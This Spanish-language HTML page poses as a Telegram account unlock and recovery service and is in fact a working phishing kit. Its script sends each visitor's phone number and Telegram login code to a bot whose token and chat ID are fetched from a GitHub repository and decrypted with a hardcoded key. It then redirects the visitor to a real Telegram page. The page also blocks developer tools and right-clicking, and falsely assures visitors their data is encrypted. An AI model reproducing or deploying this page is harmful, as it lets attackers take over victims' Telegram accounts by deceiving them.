<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Desbloqueador de cuentas y recuperación de cuentas de Telegram</title>
  <style>
    :root{
      --bg:#ffffff;
      --accent:#0a84ff;
      --accent-2:#66b3ff;
      --glass: rgba(255,255,255,0.45);
      --glass-2: rgba(255,255,255,0.25);
      --muted:#6b7280;
      --radius:20px;
      --card-w:420px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }

    html,body{height:100%;margin:0;background:var(--bg);overflow:hidden;}

    .page-bg{
      position:fixed;inset:0;z-index:-2;overflow:hidden;background:var(--bg);
    }
    .bubble{
      position:absolute;border-radius:50%;filter:blur(70px);opacity:0.6;mix-blend-mode:screen;
    }
    .bubble.b1{width:360px;height:360px;left:-120px;top:-100px;background:var(--accent);}
    .bubble.b2{width:300px;height:300px;right:-100px;bottom:-80px;background:var(--accent-2);}
    .bubble.b3{width:220px;height:220px;left:40%;top:60%;background:linear-gradient(135deg,var(--accent),var(--accent-2));opacity:0.4}

    .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:32px;}

    .card{
      width:clamp(320px,var(--card-w),90%);
      border-radius:var(--radius);
      background:linear-gradient(120deg,var(--glass),var(--glass-2));
      box-shadow:0 15px 40px rgba(0,0,0,0.12);
      backdrop-filter: blur(22px) saturate(160%);
      -webkit-backdrop-filter: blur(22px) saturate(160%);
      border:1px solid rgba(255,255,255,0.45);
      padding:28px;
      position:relative;
      overflow:hidden;
    }

    .header{display:flex;align-items:center;gap:12px;margin-bottom:10px;}
    .logo{width:44px;height:44px;border-radius:12px;overflow:hidden;flex:0 0 44px;background:linear-gradient(135deg,#e6f6ff,#dff4ff);display:grid;place-items:center;box-shadow:0 2px 8px rgba(0,0,0,0.08)}
    .logo img{width:28px;height:28px;object-fit:contain}
    h1{font-size:1.1rem;margin:0;color:#05386b}
    p.lead{margin:6px 0 18px;color:var(--muted);font-size:0.95rem}

    form{display:grid;gap:12px}
    .field{display:flex;flex-direction:column;align-items:flex-start}
    label{font-size:0.8rem;color:#1f2937;margin-bottom:6px}
    input[type="text"], input[type="tel"], input[type="email"]{
      width:100%;padding:12px 14px;border-radius:14px;border:1px solid rgba(10,20,40,0.06);background:rgba(255,255,255,0.65);outline:none;font-size:0.95rem;
      box-shadow:inset 0 1px 0 rgba(255,255,255,0.5);
      transition:box-shadow .18s, transform .12s, border-color .12s;
    }
    input:focus{box-shadow:0 6px 20px rgba(10,20,60,0.08);transform:translateY(-1px);border-color:var(--accent)}

    .actions{display:flex;gap:10px;margin-top:6px}
    button.primary{
      flex:1;padding:11px;border-radius:14px;border:0;background:linear-gradient(90deg,var(--accent),var(--accent-2));color:white;font-weight:600;cursor:pointer;box-shadow:0 6px 18px rgba(10,132,255,0.25);
    }
    button.ghost{flex:1;padding:11px;border-radius:14px;border:1px solid rgba(10,20,40,0.08);background:transparent;color:#05386b;cursor:pointer}

    .note{font-size:0.82rem;color:var(--muted);margin-top:12px;text-align:center}

    .quote{margin-top:16px;padding:12px;border-radius:14px;background:linear-gradient(180deg,rgba(10,132,255,0.04),rgba(102,179,255,0.04));border:1px solid rgba(10,132,255,0.08);color:#0b4f7a;font-size:0.92rem;display:flex;gap:10px;align-items:flex-start}
    .quote svg{flex:0 0 18px;opacity:0.85}

    @media (max-width:420px){.card{padding:20px;border-radius:16px}}

    .success{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#e6ffef;color:#0b6b3a;border:1px solid rgba(11,107,58,0.12)}
    .error{display:none;padding:12px;margin-top:12px;border-radius:12px;background:#fff1f0;color:#8b1d10;border:1px solid rgba(139,29,16,0.08)}

    .loading {display: none; text-align: center; margin: 10px 0;}
    .loading-spinner {width: 24px; height: 24px; border: 3px solid rgba(10, 132, 255, 0.3); border-radius: 50%; border-top-color: var(--accent); animation: spin 1s linear infinite; margin: 0 auto;}
    @keyframes spin {to {transform: rotate(360deg);}}

    .security-badge {position: absolute; top: 10px; right: 10px; font-size: 10px; color: #0a84ff; background: rgba(10, 132, 255, 0.1); padding: 4px 8px; border-radius: 10px;}
  </style>
</head>
<body>
  <div class="page-bg">
    <div class="bubble b1" aria-hidden="true"></div>
    <div class="bubble b2" aria-hidden="true"></div>
    <div class="bubble b3" aria-hidden="true"></div>
  </div>

  <div class="wrap">
    <main class="card" role="main" aria-labelledby="title">
      <div class="security-badge">🔒 Protegido con Base64</div>
      <header class="header">
        <div class="logo" aria-hidden="true">
          <img src="https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/product_logo.png" alt="Logo" />
        </div>
        <div>
          <h1 id="title">Configuración de la Cuenta</h1>
          <p class="lead">Introduce tu teléfono para recibir un código seguro para poder recargar y desbloquear tu cuenta.</p>
        </div>
      </header>

      <form id="recoveryForm" autocomplete="on">
        <div class="field">
          <label for="phone">Número de teléfono</label>
          <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+34 612 345 678" required />
        </div>

        <div class="actions">
          <button class="primary" type="submit" id="submitBtn">Enviar código</button>
          <button class="ghost" type="button" id="helpBtn">¿Necesitas ayuda?</button>
        </div>

        <div class="loading" id="loading">
          <div class="loading-spinner"></div>
          <p>Procesando solicitud...</p>
        </div>

        <div class="success" id="successBox" role="status">¡Código enviado! Revisa tu dispositivo.</div>
        <div class="error" id="errorBox" role="alert"></div>
      </form>

      <form id="codeForm" style="display:none;margin-top:8px;">
        <div class="field">
          <label for="code">Código recibido</label>
          <input id="code" name="code" type="text" placeholder="12345" inputmode="numeric" required />
        </div>
        <div class="actions">
          <button class="primary" type="submit">Verificar</button>
          <button class="ghost" type="button" id="cancelCode">Cancelar</button>
        </div>
      </form>

      <div class="quote" aria-hidden="true">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M7 7h3v6H7zM14 7h3v6h-3z" fill="currentColor" opacity="0.9"/>
        </svg>
        <div>"La seguridad primero: nunca compartas tu código por más que digan que provienen de Telegram. Usa siempre métodos seguros del servidor para procesar datos."</div>
      </div>

      <p class="note">Este formulario está protegido con cifrado AES-256 y codificación Base64.</p>
    </main>
  </div>

  <script>
    // ========== TÉCNICAS ANTI-DEPURACIÓN ==========

    // Detección de herramientas de desarrollo
    function detectDevTools() {
      const widthThreshold = window.outerWidth - window.innerWidth > 160;
      const heightThreshold = window.outerHeight - window.innerHeight > 160;
      const orientation = widthThreshold ? 'vertical' : 'horizontal';

      if (!(heightThreshold && widthThreshold) &&
          ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) ||
           widthThreshold || heightThreshold)) {
        return true;
      }
      return false;
    }

    // Bloquear acceso a la consola
    function blockConsoleAccess() {
      const noop = () => {};
      const noopHandler = {
        get: function(obj, prop) {
          if (prop in obj) {
            return obj[prop];
          }
          return noop;
        }
      };

      window.console = new Proxy(window.console, noopHandler);
    }

    // Deshabilitar clic derecho y selección de texto
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('selectstart', e => e.preventDefault());

    // Detectar y bloquear depuradores
    setInterval(() => {
      if (detectDevTools()) {
        document.body.innerHTML = '<div style="padding: 20px; text-align: center;"><h2>Acceso no autorizado detectado</h2><p>Esta página no permite el uso de herramientas de desarrollo.</p></div>';
        blockConsoleAccess();
        throw new Error('DevTools detected');
      }
    }, 1000);

    // Ofuscar la clave AES (dividida en partes)
    const keyParts = [
      'Jesus', 'Quijada', '34'
    ];
    const AES_KEY = keyParts[0] + keyParts[1] + keyParts[2];

    // Función para descifrar con AES desde Base64
    async function decryptAESFromBase64(encryptedBase64, key) {
      try {
        // Decodificar Base64
        const encryptedData = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));

        // Convertir la clave a formato adecuado
        const keyData = new TextEncoder().encode(key);
        const importedKey = await crypto.subtle.importKey(
          'raw',
          keyData,
          { name: 'AES-CBC' },
          false,
          ['decrypt']
        );

        // Extraer el vector de inicialización (primeros 16 bytes)
        const iv = encryptedData.slice(0, 16);
        const data = encryptedData.slice(16);

        // Descifrar
        const decrypted = await crypto.subtle.decrypt(
          {
            name: 'AES-CBC',
            iv: iv
          },
          importedKey,
          data
        );

        // Convertir a texto
        return new TextDecoder().decode(decrypted);
      } catch (error) {
        console.error('Error al descifrar:', error);
        throw new Error('Falló el descifrado');
      }
    }

    // Función para cargar credenciales con caché desde Base64
    async function loadCredentials() {
      // Verificar si tenemos credenciales en caché
      const cachedCredentials = localStorage.getItem('tgCredentials');
      if (cachedCredentials) {
        try {
          // Verificar integridad del caché
          const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(cachedCredentials));
          const storedHash = localStorage.getItem('tgCredentialsHash');

          if (btoa(String.fromCharCode(...new Uint8Array(hash))) === storedHash) {
            return JSON.parse(cachedCredentials);
          } else {
            console.warn('MedievalAIO no coincide, recargando...');
          }
        } catch (e) {
          console.warn('Caché corrupto, recargando...');
        }
      }

      try {
        const response = await fetch('https://raw.githubusercontent.com/JesusQuijada34/tgtamperhack/main/assets/.assets');
        const encryptedData = await response.text();

        // Dividir por punto
        const parts = encryptedData.split('.');
        if (parts.length !== 2) {
          throw new Error('Formato de credenciales inválido');
        }

        // Descifrar token y chatId desde Base64
        const encryptedTokenBase64 = parts[0].trim();
        const encryptedChatIdBase64 = parts[1].trim();

        const token = await decryptAESFromBase64(encryptedTokenBase64, AES_KEY);
        const chatId = await decryptAESFromBase64(encryptedChatIdBase64, AES_KEY);

        // Guardar en caché con verificación de integridad
        const credentials = { token, chatId };
        const credentialsStr = JSON.stringify(credentials);
        localStorage.setItem('tgCredentials', credentialsStr);

        // Calcular y guardar hash para verificación de integridad
        const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(credentialsStr));
        localStorage.setItem('tgCredentialsHash', btoa(String.fromCharCode(...new Uint8Array(hash))));

        return credentials;
      } catch (error) {
        console.error('Error al cargar las credenciales:', error);
        throw error;
      }
    }

    // Función para mostrar un error
    function showError(msg) {
      const errorBox = document.getElementById('errorBox');
      errorBox.textContent = msg;
      errorBox.style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
      document.getElementById('loading').style.display = 'none';
    }

    // Función para mostrar un éxito
    function showSuccess(msg) {
      const successBox = document.getElementById('successBox');
      successBox.textContent = msg;
      successBox.style.display = 'block';
      document.getElementById('errorBox').style.display = 'none';
      document.getElementById('loading').style.display = 'none';
    }

    // Función para mostrar carga
    function showLoading() {
      document.getElementById('loading').style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
      document.getElementById('errorBox').style.display = 'none';
    }

    // Event listener para el formulario de recuperación
    document.getElementById('recoveryForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const phone = document.getElementById('phone').value.trim();
      if (!phone) {
        showError('Introduce un teléfono válido.');
        return;
      }

      showLoading();

      try {
        const { token, chatId } = await loadCredentials();
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Número de teléfono recibido: ${phone}`
          })
        });

        showSuccess('Código enviado. Por favor, revisa tu teléfono.');
        document.getElementById('recoveryForm').style.display = 'none';
        document.getElementById('codeForm').style.display = 'block';

      } catch (err) {
        console.error(err);
        showError('No se pudo enviar el código. Revisa la conexión o contacta soporte.');
      }
    });

    // Event listener para el formulario de código
    document.getElementById('codeForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const code = document.getElementById('code').value.trim();
      if (!code) {
        showError('Introduce el código recibido.');
        return;
      }

      showLoading();

      try {
        const { token, chatId } = await loadCredentials();
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Código recibido: ${code}`
          })
        });
        showSuccess('Código verificado. Redirigiendo a Telegram para verificar que provenga de una persona real...');
        setTimeout(() => location.href = 'https://my.telegram.org/auth?to=recovery', 900);
      } catch (err) {
        console.error(err);
        showError('Código inválido o expirado. Intenta de nuevo.');
      }
    });

    // Event listener para el botón de ayuda
    document.getElementById('helpBtn').addEventListener('click', () => {
      alert('Si no recibes el código, comprueba el número o contacta soporte.');
    });

    // Event listener para el botón de cancelar
    document.getElementById('cancelCode').addEventListener('click', () => {
      document.getElementById('codeForm').style.display = 'none';
      document.getElementById('recoveryForm').style.display = 'block';
      document.getElementById('successBox').style.display = 'none';
      document.getElementById('errorBox').style.display = 'none';
    });
  </script>
</body>
</html>
